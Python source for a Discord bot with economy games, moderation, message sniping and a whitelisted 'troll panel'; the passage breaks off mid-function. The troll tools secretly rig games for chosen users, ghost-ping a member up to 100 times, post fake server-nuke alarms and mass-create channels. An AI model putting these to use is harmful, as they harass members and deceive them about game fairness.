import os
import re
import json
import time
import random
import sqlite3
import asyncio
from datetime import timedelta

import discord
from discord import app_commands
from discord.ext import commands

# =========================================================
# OWNER & TOKEN SETUP
# =========================================================

OWNER_IDS = {1286560808528117820, 1152424544557088849}

TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    from dotenv import load_dotenv
    load_dotenv()
    TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN was not found in your environment or .env file.")

# =========================================================
# BOT SETUP
# =========================================================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(
    command_prefix=",,",
    intents=intents,
    help_command=None
)

@bot.command(name="sync", description="Sync slash commands")
@commands.has_permissions(administrator=True)
async def sync(ctx):
    try:
        synced = await bot.tree.sync()
        await ctx.send(f"✅ Successfully synced {len(synced)} slash command(s) globally!")
    except Exception as e:
        await ctx.send(f"❌ Failed to sync commands: `{e}`")
    try:
        bot.add_view(GiveawayEntryView())
        print("Registered GiveawayEntryView for persistent buttons.")
    except Exception as e:
        print("Failed to add giveaway view:", e)

    try:
        now_ts = int(time.time())
        cursor.execute(
            "SELECT message_id, channel_id, guild_id, prize, winners, end_time, host_id FROM giveaways WHERE end_time > ?",
            (now_ts,)
        )
        rows = cursor.fetchall()
        for row in rows:
            message_id, channel_id, guild_id, prize, winners, end_time, host_id = row
            asyncio.create_task(_handle_giveaway_end(message_id, channel_id, guild_id, prize, winners, int(end_time), host_id))
        if rows:
            print(f"Resumed {len(rows)} pending giveaway(s).")
    except Exception as e:
        print("Error scheduling pending giveaways:", e)
# =========================================================
# DATABASE SETUP
# =========================================================

db = sqlite3.connect("economy.db", check_same_thread=False)
cursor = db.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    wallet INTEGER DEFAULT 100,
    bank INTEGER DEFAULT 0,
    daily_claim REAL DEFAULT 0,
    weekly_claim REAL DEFAULT 0,
    work_claim REAL DEFAULT 0,
    crime_claim REAL DEFAULT 0,
    rob_claim REAL DEFAULT 0
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS warnings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    moderator_id INTEGER,
    reason TEXT
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS marriages (
    user1_id INTEGER PRIMARY KEY,
    user2_id INTEGER NOT NULL
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS blacklist (
    user_id INTEGER PRIMARY KEY,
    moderator_id INTEGER,
    reason TEXT
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS server_blacklist (
    guild_id INTEGER PRIMARY KEY,
    moderator_id INTEGER,
    reason TEXT
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS troll_whitelist (
    user_id INTEGER PRIMARY KEY,
    added_by INTEGER
)
""")

for _owner_id in OWNER_IDS:
    cursor.execute(
        "INSERT OR IGNORE INTO troll_whitelist (user_id, added_by) VALUES (?, ?)",
        (_owner_id, _owner_id)
    )

db.commit()

# =========================================================
# MEMORY CACHE & TROLL PANEL STATES
# =========================================================

sniped_messages = {}
edited_messages = {}
afk_users = {}

troll_settings = {}

def is_troll_whitelisted(user_id):
    if user_id in OWNER_IDS:
        return True
    cursor.execute("SELECT 1 FROM troll_whitelist WHERE user_id = ?", (user_id,))
    return cursor.fetchone() is not None

@bot.event
async def on_message_delete(message):
    if message.author.bot:
        return
    if message.channel.id not in sniped_messages:
        sniped_messages[message.channel.id] = []
    sniped_messages[message.channel.id].append({
        "content": message.content,
        "author": message.author,
        "attachments": [att.url for att in message.attachments]
    })

@bot.event
async def on_message_edit(before, after):
    if before.author.bot or before.content == after.content:
        return
    if before.channel.id not in edited_messages:
        edited_messages[before.channel.id] = []
    edited_messages[before.channel.id].append({
        "before": before.content,
        "after": after.content,
        "author": before.author
    })
    if len(edited_messages[before.channel.id]) > 5:
        edited_messages[before.channel.id].pop(0)

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    is_standalone_bot_mention = (
        bot.user in message.mentions
        and not message.mention_everyone
        and message.reference is None
        and message.content.strip() in (f"<@{bot.user.id}>", f"<@!{bot.user.id}>")
    )

    if is_standalone_bot_mention:
        embed = discord.Embed(
            title="🤖 Bot Help Panel",
            description="hello i am rynx i was created by dust and gingerini my prefixs are ,, and /",
            color=discord.Color.from_rgb(30, 31, 34)
        )
        embed.add_field(name="📌 Prefixes", value="`,,` or `/`", inline=True)
        embed.add_field(name="👑 Creators", value="`dust` & `gingerini`", inline=True)
        embed.add_field(name="💰 Economy", value="`balance`, `daily`, `work`, `gamble`, `dice`, `slots`, `crime`, `rob`, `pay`, `deposit`, `withdraw`", inline=False)
        embed.add_field(name="🎉 Fun & Social", value="`cf`, `8ball`, `gayrate`, `pp`, `iq`, `roast`, `kiss`, `gif`, `hack`, `brainrot_dice`, `marry`, `divorce`, `mock`", inline=False)
        embed.add_field(name="🛡️ Moderation & Utility", value="`afk`, `ban`, `unban`, `kick`, `mute`, `unmute`, `warn`, `clear`, `slowmode`, `poll`, `say`, `embed`, `snipe`, `editsnipe`, `avatar`, `help`, `trollpanel`, `whitelist`, `unwhitelist`, `ghostping`, `fakenuke`, `blacklist`, `serverblacklist`", inline=False)
        await message.channel.send(embed=embed)
        return

    if message.mentions:
        for member in message.mentions:
            if member.id in afk_users:
                afk_users[member.id]["mentions"].append({
                    "author_name": message.author.display_name,
                    "content": message.content,
                    "jump_url": message.jump_url,
                    "time": time.time()
                })
                data = afk_users[member.id]
                embed = discord.Embed(
                    description=f"💤 **{member.display_name}** is AFK: {data['reason']} (<t:{int(data['time'])}:R>)",
                    color=discord.Color.from_rgb(30, 31, 34)
                )
                await message.channel.send(embed=embed)

    if message.author.id in afk_users:
        data = afk_users.pop(message.author.id)
        duration_sec = int(time.time() - data["time"])
        
        if duration_sec < 60:
            dur_str = f"{duration_sec} seconds"
        elif duration_sec < 3600:
            dur_str = f"{duration_sec // 60} minutes"
        else:
            dur_str = f"{duration_sec // 3600} hours"

        embed = discord.Embed(
            description=f"Welcome back, {message.author.mention}! I removed your AFK. You were AFK for {dur_str}.",
            color=discord.Color.from_rgb(30, 31, 34)
        )

        if data["mentions"]:
            mentions_text = []
            for m in data["mentions"]:
                time_ago = int(time.time() - m["time"])
                if time_ago < 60:
                    time_str = f"{time_ago} seconds ago"
                elif time_ago < 3600:
                    time_str = f"{time_ago // 60} minutes ago"
                else:
                    time_str = f"{time_ago // 3600} hours ago"
                
                mentions_text.append(f"**{m['author_name']}**, {time_str}\n[Click to view message]({m['jump_url']})")
            
            embed.add_field(
                name=f"You received {len(data['mentions'])} mention(s)",
                value="\n\n".join(mentions_text),
                inline=False
            )

        await message.channel.send(embed=embed)

    await bot.process_commands(message)

# =========================================================
# HELPER FUNCTIONS
# =========================================================

def get_user_econ(user_id):
    cursor.execute("SELECT wallet, bank FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if row is None:
        cursor.execute(
            "INSERT INTO users (user_id, wallet, bank, daily_claim, weekly_claim, work_claim, crime_claim, rob_claim) VALUES (?, 100, 0, 0, 0, 0, 0, 0)",
            (user_id,)
        )
        db.commit()
        return 100, 0
    return row[0], row[1]

def update_wallet(user_id, amount):
    wallet, bank = get_user_econ(user_id)
    new_wallet = wallet + amount
    cursor.execute("UPDATE users SET wallet = ? WHERE user_id = ?", (new_wallet, user_id))
    db.commit()

def get_global_rank(user_id):
    cursor.execute("SELECT user_id, (wallet + bank) as net FROM users ORDER BY net DESC")
    rows = cursor.fetchall()
    for index, row in enumerate(rows, start=1):
        if row[0] == user_id:
            return index
    return "#N/A"

def parse_duration(text):
    pattern = r"^(\d+)\s*(s|m|h|d|w)$"
    match = re.match(pattern, text.lower().strip())
    if not match:
        return None
    amount = int(match.group(1))
    unit = match.group(2)
    multipliers = {"s": 1, "m": 60, "h": 3600, "d": 86400, "w": 604800}
    return amount * multipliers[unit]

# =========================================================
# GLOBAL BLACKLIST & SERVER BLACKLIST CHECK
# =========================================================

@bot.check
async def globally_block_blacklisted(ctx):
    if ctx.guild:
        cursor.execute("SELECT 1 FROM server_blacklist WHERE guild_id = ?", (ctx.guild.id,))
        if cursor.fetchone():
            return False

    cursor.execute("SELECT 1 FROM blacklist WHERE user_id = ?", (ctx.author.id,))
    if cursor.fetchone():
        embed = discord.Embed(
            description=f"⚠️ {ctx.author.mention}: You are **globally blacklisted** from using the bot.",
            color=discord.Color.orange()
        )
        if ctx.interaction:
            try:
                if not ctx.interaction.response.is_done():
                    await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
                else:
                    await ctx.interaction.followup.send(embed=embed, ephemeral=True)
            except Exception:
                pass
        else:
            try:
                await ctx.send(embed=embed, delete_after=5)
            except Exception:
                pass
        return False
    return True

# =========================================================
# ERROR HANDLER & COMMAND LISTINGS
# =========================================================

COMMAND_USAGE = {
    "help": ",,help",
    "afk": ",,afk [reason]",
    "ban": ",,ban <member> [reason]",
    "unban": ",,unban <user_id>",
    "mute": ",,mute <member> [duration] [reason]",
    "kick": ",,kick <member> [reason]",
    "warn": ",,warn <member> [reason]",
    "pay": ",,pay <member> <amount>",
    "gamble": ",,gamble <amount>",
    "dice": ",,dice <amount>",
    "slots": ",,slots <amount>",
    "crime": ",,crime",
    "rob": ",,rob <member>",
    "work": ",,work",
    "deposit": ",,deposit <amount>",
    "withdraw": ",,withdraw <amount>",
    "marry": ",,marry <member>",
    "divorce": ",,divorce",
    "avatar": ",,avatar [member]",
    "cf": ",,cf",
    "gayrate": ",,gayrate [member]",
    "8ball": ",,8ball <question>",
    "pp": ",,pp [member]",
    "roast": ",,roast [member1] [member2] [member3]",
    "iq": ",,iq [member]",
    "kiss": ",,kiss <member>",
    "gif": ",,gif <search_term>",
    "snipe": ",,snipe [number]",
    "editsnipe": ",,editsnipe",
    "hack": ",,hack <member>",
    "poll": ",,poll <question>",
    "say": ",,say <message>",
    "embed": ",,embed <title> | <description>",
    "clear": ",,clear <amount>",
    "purge": ",,purge <amount>",
    "slowmode": ",,slowmode <seconds>",
    "brainrot_dice": ",,brainrot_dice [amount]",
    "blacklist": ",,blacklist <user_id_or_mention> [reason]",
    "unblacklist": ",,unblacklist <user_id>",
    "serverblacklist": ",,serverblacklist <guild_id> [reason]",
    "serverunblacklist": ",,serverunblacklist <guild_id>",
    "trollpanel": ",,trollpanel",
    "whitelist": ",,whitelist <member>",
    "unwhitelist": ",,unwhitelist <member>",
    "ghostping": ",,ghostping <member>",
    "mock": ",,mock <text>",
    "fakenuke": ",,fakenuke [member]",
    "masscreate": ",,masscreate <count> <name>",
    "setup": ",,setup [style]"
}

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandInvokeError):
        error = error.original

    if isinstance(error, commands.CommandNotFound):
        return

    cmd_name = ctx.command.name if ctx.command else "command"

    if isinstance(error, commands.MissingRequiredArgument):
        arg_name = error.param.name
        usage_str = COMMAND_USAGE.get(cmd_name, f",,{cmd_name} <{arg_name}>")
        embed = discord.Embed(
            description=(
                f"```\n{usage_str}\n"
                f"{' ' * max(0, usage_str.find('<') if '<' in usage_str else 0)}"
                f"^^^^^^^^^\n\n"
                f"{arg_name} is a required argument that is missing.\n```"
            ),
            color=discord.Color.from_rgb(47, 49, 54)
        )
        if ctx.interaction:
            try:
                return await ctx.interaction.followup.send(embed=embed, ephemeral=True)
            except Exception:
                return
        return await ctx.send(embed=embed)

    if isinstance(error, commands.BadArgument):
        usage_str = COMMAND_USAGE.get(cmd_name, f",,{cmd_name}")
        embed = discord.Embed(
            description=f"```\n{usage_str}\n\nInvalid argument. Please check the command format.\n```",
            color=discord.Color.from_rgb(47, 49, 54)
        )
        if ctx.interaction:
            try:
                return await ctx.interaction.followup.send(embed=embed, ephemeral=True)
            except Exception:
                return
        return await ctx.send(embed=embed)

    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            title="🛡️ Permission Denied",
            description="Only **server administrators or moderators** can use this command.",
            color=discord.Color.red()
        )
        if ctx.interaction:
            try:
                return await ctx.interaction.followup.send(embed=embed, ephemeral=True)
            except Exception:
                return
        return await ctx.send(embed=embed)

    if isinstance(error, commands.BotMissingPermissions):
        embed = discord.Embed(
            title="Bot is Missing Permissions",
            description="I don't have the Discord permissions required to perform this command.",
            color=discord.Color.red()
        )
        if ctx.interaction:
            try:
                return await ctx.interaction.followup.send(embed=embed, ephemeral=True)
            except Exception:
                return
        return await ctx.send(embed=embed)

    embed = discord.Embed(
        title="⚠️ Command Error",
        description=f"Something went wrong: `{str(error)[:900]}`",
        color=discord.Color.red()
    )
    if ctx.interaction:
        try:
            return await ctx.interaction.followup.send(embed=embed, ephemeral=True)
        except Exception:
            return
    return await ctx.send(embed=embed)

# =========================================================
# TROLL PANEL MODALS & VIEW
# =========================================================

class GhostPingModal(discord.ui.Modal, title="Ghost Ping Tool"):
    member_input = discord.ui.TextInput(label="Member ID or Mention", placeholder="e.g. 10080330264 or @User", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        val = self.member_input.value.strip()
        target_id = re.sub(r'\D', '', val)
        try:
            target = await interaction.guild.fetch_member(int(target_id))
        except Exception:
            target = None

        if not target:
            return await interaction.response.send_message("Could not find that member.", ephemeral=True)

        await interaction.response.send_message("😂 Ghost pinging...", ephemeral=True)
        msg = await interaction.channel.send(f"{target.mention}")
        try:
            await msg.delete()
        except Exception:
            pass

class MockModal(discord.ui.Modal, title="Mock Text Tool"):
    text_input = discord.ui.TextInput(label="Text to Mock", placeholder="Type something...", style=discord.TextStyle.paragraph, required=True)

    async def on_submit(self, interaction: discord.Interaction):
        text = self.text_input.value
        mocked_text = "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(text)
        )
        embed = discord.Embed(description=f"🚿 {mocked_text}", color=discord.Color.gold())
        await interaction.response.send_message(embed=embed)

class TrollPanelView(discord.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=120)
        self.user_id = user_id
        if self.user_id not in troll_settings:
            troll_settings[self.user_id] = {"dice": False, "slots": False, "brainrot": False}
        self.update_buttons()

    def update_buttons(self):
        settings = troll_settings[self.user_id]
        self.dice_btn.label = f"Dice Rig: {'ON 🟢' if settings['dice'] else 'OFF 🔴'}"
        self.slots_btn.label = f"Slots Rig: {'ON 🟢' if settings['slots'] else 'OFF 🔴'}"
        self.brainrot_btn.label = f"Brainrot Rig: {'ON 🟢' if settings['brainrot'] else 'OFF 🔴'}"

    @discord.ui.button(label="Dice Rig", style=discord.ButtonStyle.secondary, row=0)
    async def dice_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            return await interaction.response.send_message("This isn't your troll panel!", ephemeral=True)
        troll_settings[self.user_id]["dice"] = not troll_settings[self.user_id]["dice"]
        self.update_buttons()
        embed = interaction.message.embeds[0]
        embed.description = f"🎛️ **Troll Panel Settings for <@{self.user_id}>**\nConfigure your rigged game outcomes & troll tools below:"
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Slots Rig", style=discord.ButtonStyle.secondary, row=0)
    async def slots_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            return await interaction.response.send_message("This isn't your troll panel!", ephemeral=True)
        troll_settings[self.user_id]["slots"] = not troll_settings[self.user_id]["slots"]
        self.update_buttons()
        embed = interaction.message.embeds[0]
        embed.description = f"🎛️ **Troll Panel Settings for <@{self.user_id}>**\nConfigure your rigged game outcomes & troll tools below:"
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Brainrot Rig", style=discord.ButtonStyle.secondary, row=0)
    async def brainrot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            return await interaction.response.send_message("This isn't your troll panel!", ephemeral=True)
        troll_settings[self.user_id]["brainrot"] = not troll_settings[self.user_id]["brainrot"]
        self.update_buttons()
        embed = interaction.message.embeds[0]
        embed.description = f"🎛️ **Troll Panel Settings for <@{self.user_id}>**\nConfigure your rigged game outcomes & troll tools below:"
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="👻 Ghost Ping", style=discord.ButtonStyle.danger, row=1)
    async def ghostping_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            return await interaction.response.send_message("This isn't your troll panel!", ephemeral=True)
        await interaction.response.send_modal(GhostPingModal())

    @discord.ui.button(label="🚿 Mock Text", style=discord.ButtonStyle.primary, row=1)
    async def mock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            return await interaction.response.send_message("This isn't your troll panel!", ephemeral=True)
        await interaction.response.send_modal(MockModal())

    @discord.ui.button(label="🚨 Fake Nuke", style=discord.ButtonStyle.danger, row=1)
    async def fakenuke_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            return await interaction.response.send_message("This isn't your troll panel!", ephemeral=True)
        
        embed = discord.Embed(
            title="🚨 **WARNING: SERVER NUKE IN PROGRESS** 🚨",
            description=f"Thank you {interaction.user.mention} for nuking this server the channels will be deleted soon huzzs.",
            color=discord.Color.red()
        )
        embed.set_image(url="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbTZibHhwcTd0c2k1a3dta3JrOHY4ZjVsdWZsZjJlMnIzNW96ajVsaiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3oKIPiqfUtLCnIKxRS/giphy.gif")
        await interaction.response.send_message("🚨 Initiating fake nuke...", ephemeral=True)
        await interaction.channel.send(embed=embed)

@bot.hybrid_command(name="whitelist", description="Whitelist a member to use the Troll Panel and troll tools")
async def whitelist(ctx, member: discord.Member):
    if ctx.author.id not in OWNER_IDS:
        embed = discord.Embed(description="👑 Only the two bot owners can manage the Troll Panel whitelist.", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    if member.bot:
        embed = discord.Embed(description="Bots cannot be added to the Troll Panel whitelist.", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    cursor.execute("INSERT OR IGNORE INTO troll_whitelist (user_id, added_by) VALUES (?, ?)", (member.id, ctx.author.id))
    db.commit()

    if cursor.rowcount == 0:
        description = f"ℹ️ {member.mention} is already whitelisted for the Troll Panel."
        color = discord.Color.blurple()
    else:
        description = f"🎉 {member.mention} has been **whitelisted** for the Troll Panel and troll tools."
        color = discord.Color.green()

    embed = discord.Embed(description=description, color=color)
    if ctx.interaction:
        return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
    await ctx.send(embed=embed)

@bot.hybrid_command(name="unwhitelist", description="Remove a member from the Troll Panel whitelist")
async def unwhitelist(ctx, member: discord.Member):
    if ctx.author.id not in OWNER_IDS:
        embed = discord.Embed(description="👑 Only the two bot owners can manage the Troll Panel whitelist.", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    if member.id in OWNER_IDS:
        embed = discord.Embed(description="👑 The two bot owners are permanently whitelisted and cannot be removed.", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    cursor.execute("DELETE FROM troll_whitelist WHERE user_id = ?", (member.id,))
    db.commit()

    if cursor.rowcount == 0:
        description = f"ℹ️ {member.mention} is not currently whitelisted."
        color = discord.Color.blurple()
    else:
        description = f"{member.mention} has been **removed** from the Troll Panel whitelist."
        color = discord.Color.green()

    embed = discord.Embed(description=description, color=color)
    if ctx.interaction:
        return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
    await ctx.send(embed=embed)

@bot.hybrid_command(name="trollpanel", description="Open the troll panel to rig games and troll members")
async def trollpanel(ctx):
    if not is_troll_whitelisted(ctx.author.id):
        embed = discord.Embed(description="You are not whitelisted to access the Troll Panel.", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)
    
    view = TrollPanelView(ctx.author.id)
    embed = discord.Embed(
        title="🃏 Troll Panel & Game Rigging",
        description=f"🎛️ **Troll Panel Settings for <@{ctx.author.id}>**\nConfigure your rigged game outcomes & troll tools below:",
        color=discord.Color.dark_embed()
    )
    if ctx.interaction:
        await ctx.interaction.response.send_message(embed=embed, view=view, ephemeral=True)
    else:
        await ctx.send(embed=embed, view=view, delete_after=120)

class GhostPingControlView(discord.ui.View):
    def __init__(self, owner_id: int):
        super().__init__(timeout=None)
        self.owner_id = owner_id
        self.stop_event = asyncio.Event()
        self.stopped_by = None

    @discord.ui.button(label="Stop", style=discord.ButtonStyle.danger, emoji="🛑")
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.owner_id and interaction.user.id not in OWNER_IDS:
            return await interaction.response.send_message("Only the command invoker or bot owners can stop this.", ephemeral=True)

        if self.stop_event.is_set():
            return await interaction.response.send_message("Already stopping...", ephemeral=True)

        self.stop_event.set()
        self.stopped_by = interaction.user.id

        for child in self.children:
            child.disabled = True

        try:
            await interaction.response.edit_message(view=self)
        except Exception:
            try:
                await interaction.response.send_message("Stopping...", ephemeral=True)
            except Exception:
                pass


@bot.hybrid_command(
    name="ghostping",
    description="Ghost ping a user with stop button."
)
@app_commands.describe(member="The member to ghost-ping", times="How many times (1-100)", message="Optional message after the mention")
async def ghostping(ctx, member: discord.Member, times: int = 1, *, message: str = ""):
    # permission / whitelist check
    if not is_troll_whitelisted(ctx.author.id):
        embed = discord.Embed(description="You are not whitelisted to use this troll command.", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    # sanitize times
    try:
        times = int(times)
    except Exception:
        times = 1
    times = max(1, min(100, times))

    # delete invoking message for prefix usage if possible
    if not ctx.interaction and ctx.message:
        try:
            await ctx.message.delete()
        except Exception:
            pass

    # prepare view + embed
    view = GhostPingControlView(owner_id=ctx.author.id)
    embed = discord.Embed(
        title=f"👻 Ghost pinging {member.display_name} x{times}...",
        description=f"Progress: 0/{times}",
        color=discord.Color.blurple()
    )
    embed.set_footer(text="Press Stop to cancel the ghost pings.")

    # Send status: ephemeral for slash, channel message for prefix
    status_msg = None
    if ctx.interaction:
        try:
            await ctx.interaction.response.send_message(embed=embed, view=view, ephemeral=True)
            status_msg = await ctx.interaction.original_response()
        except Exception:
            try:
                await ctx.interaction.followup.send(embed=embed, view=view, ephemeral=True)
                status_msg = await ctx.interaction.original_response()
            except Exception:
                status_msg = await ctx.channel.send(embed=embed, view=view)
    else:
        status_msg = await ctx.channel.send(embed=embed, view=view)

    # INTERVAL SET TO 1 SECOND
    delay = 1.0

    async def do_send():
        sent = 0
        content = f"{member.mention} {message}".strip() or f"{member.mention}"
        for i in range(times):
            if view.stop_event.is_set():
                break
            try:
                ping_msg = await ctx.channel.send(content)
                # delete right away (best-effort)
                try:
                    await ping_msg.delete()
                except Exception:
                    pass
                sent += 1
            except Exception:
                # stop on repeated send failures
                break

            # update status embed after each sent ping
            try:
                embed.description = f"Progress: {sent}/{times}"
                embed.set_footer(text=f"Press Stop to cancel — sent {sent}/{times}")
                await status_msg.edit(embed=embed, view=view)
            except Exception:
                pass

            # wait 1 second between pings (balances rate and load)
            if i != times - 1:
                await asyncio.sleep(delay)

        # Finalize status
        if view.stop_event.is_set():
            embed.title = "🛑 Ghost pinging stopped"
            if view.stopped_by:
                embed.description = f"Stopped by <@{view.stopped_by}> • Progress: {sent}/{times}"
            else:
                embed.description = f"Stopped • Progress: {sent}/{times}"
        else:
            embed.title = "✅ Ghost pinging completed"
            embed.description = f"Completed: {sent}/{times}"

        for child in view.children:
            child.disabled = True
        try:
            await status_msg.edit(embed=embed, view=view)
        except Exception:
            try:
                await status_msg.edit(embed=embed)
            except Exception:
                pass

        if ctx.interaction:
            try:
                await ctx.interaction.followup.send(f"✅ Ghost ping finished: {sent}/{times}", ephemeral=True)
            except Exception:
                pass

    asyncio.create_task(do_send())
    
@bot.hybrid_command(name="mock", description="Mock text in sPoNgEbOb case")
async def mock(ctx, *, text: str):
    mocked_text = "".join(
        c.upper() if i % 2 == 0 else c.lower()
        for i, c in enumerate(text)
    )
    embed = discord.Embed(description=f"🥺 {mocked_text}", color=discord.Color.gold())
    if ctx.interaction:
        await ctx.interaction.response.send_message(embed=embed)
    else:
        if ctx.message:
            try:
                await ctx.message.delete()
            except Exception:
                pass
        await ctx.send(embed=embed)

@bot.hybrid_command(name="fakenuke", description="Trigger a fake server nuke alert message for a member")
async def fakenuke(ctx, member: discord.Member = None):
    if not is_troll_whitelisted(ctx.author.id):
        embed = discord.Embed(description="You are not whitelisted to use this troll command.", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    target = member or ctx.author
    embed = discord.Embed(
        title="🚨 **WARNING: SERVER NUKE IN PROGRESS** 🚨",
        description=f"Thank you {target.mention} for nuking this server the channels will be deleted soon huzzs.",
        color=discord.Color.red()
    )
    embed.set_image(url="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbTZibHhwcTd0c2k1a3dta3JrOHY4ZjVsdWZsZjJlMnIzNW96ajVsaiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3oKIPiqfUtLCnIKxRS/giphy.gif")
    
    if ctx.interaction:
        await ctx.interaction.response.send_message("🚨 Initiating fake nuke...", ephemeral=True)
        await ctx.channel.send(embed=embed)
    else:
        if ctx.message:
            try:
                await ctx.message.delete()
            except Exception:
                pass
        await ctx.channel.send(embed=embed)

# =========================================================
# EXPERIMENTAL MASS CREATE CHANNELS COMMAND
# =========================================================

@bot.hybrid_command(name="masscreate", description="Creates multiple channels for experimental purposes.")
@app_commands.describe(
    count="Number of channels to create (1-50)",
    name="Base name for the channels"
)
@app_commands.checks.has_permissions(administrator=True)
async def masscreate(ctx, count: int, name: str):
    if count < 1 or count > 50:
        embed = discord.Embed(description="Please choose a count between 1 and 50.", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed, delete_after=5)

    if ctx.interaction:
        await ctx.interaction.response.defer(ephemeral=True)
    else:
        if ctx.message:
            try:
                await ctx.message.delete()
            except Exception:
                pass

    guild = ctx.guild
    success_count = 0

    try:
        for i in range(1, count + 1):
            channel_name = f"{name}-{i}"
            await guild.create_text_channel(name=channel_name)
            success_count += 1
            await asyncio.sleep(0.3)

        success_msg = f"Successfully created **{success_count}** channels with the base name **{name}**!"
        embed = discord.Embed(description=f"{success_msg}", color=discord.Color.green())
        
        if ctx.interaction:
            await ctx.interaction.edit_original_response(content=f"{success_msg}")
        else:
            await ctx.send(embed=embed, delete_after=10)
    except Exception as e:
        print(f"Error during mass channel creation: {e}")
        error_msg = f"Completed with errors. Created **{success_count}** channels before encountering an issue."
        if ctx.interaction:
            await ctx.interaction.edit_original_response(content=f"{error_msg}")
        else:
            await ctx.send(embed=discord.Embed(description=f"{error_msg}", color=discord.Color.red()))

# =========================================================
# ECONOMY UI & COMMANDS
# =========================================================

class WithdrawModal(discord.ui.Modal, title="Withdraw Money"):
    amount = discord.ui.TextInput(label="Amount (or 'all')", placeholder="e.g. 500 or all", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        wallet, bank = get_user_econ(interaction.user.id)
        val = self.amount.value.strip().lower()

        if val == "all":
            amount = bank
        else:
            try:
                amount = int(val)
            except ValueError:
                embed = discord.Embed(description="Please enter a valid number or 'all'.", color=discord.Color.red())
                return await interaction.response.send_message(embed=embed, ephemeral=True)

        if amount <= 0:
            embed = discord.Embed(description="Amount must be greater than zero.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)
        if bank < amount:
            embed = discord.Embed(description="You don't have that much money in your bank.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        cursor.execute("UPDATE users SET wallet = wallet + ?, bank = bank - ? WHERE user_id = ?", (amount, amount, interaction.user.id))
        db.commit()

        new_wallet, new_bank = get_user_econ(interaction.user.id)
        net = new_wallet + new_bank
        rank = get_global_rank(interaction.user.id)

        if interaction.message:
            try:
                embed = interaction.message.embeds[0]
                embed.clear_fields()
                embed.add_field(name="Wallet", value=f"🪙 {new_wallet:,}", inline=True)
                embed.add_field(name="Bank", value=f"🪙 {new_bank:,}", inline=True)
                embed.add_field(name="Net", value=f"🪙 {net:,}", inline=False)
                embed.add_field(name="Global Rank", value=f"#{rank}", inline=False)
                await interaction.message.edit(embed=embed)
            except Exception:
                pass

        success_embed = discord.Embed(description=f"🏦 Successfully withdrew **${amount:,}** from your bank.", color=discord.Color.green())
        await interaction.response.send_message(embed=success_embed, ephemeral=True)

class DepositModal(discord.ui.Modal, title="Deposit Money"):
    amount = discord.ui.TextInput(label="Amount (or 'all')", placeholder="e.g. 500 or all", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        wallet, bank = get_user_econ(interaction.user.id)
        val = self.amount.value.strip().lower()

        if val == "all":
            amount = wallet
        else:
            try:
                amount = int(val)
            except ValueError:
                embed = discord.Embed(description="Please enter a valid number or 'all'.", color=discord.Color.red())
                return await interaction.response.send_message(embed=embed, ephemeral=True)

        if amount <= 0:
            embed = discord.Embed(description="Amount must be greater than zero.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)
        if wallet < amount:
            embed = discord.Embed(description="You don't have that much money in your wallet.", color=discord.Color.red())
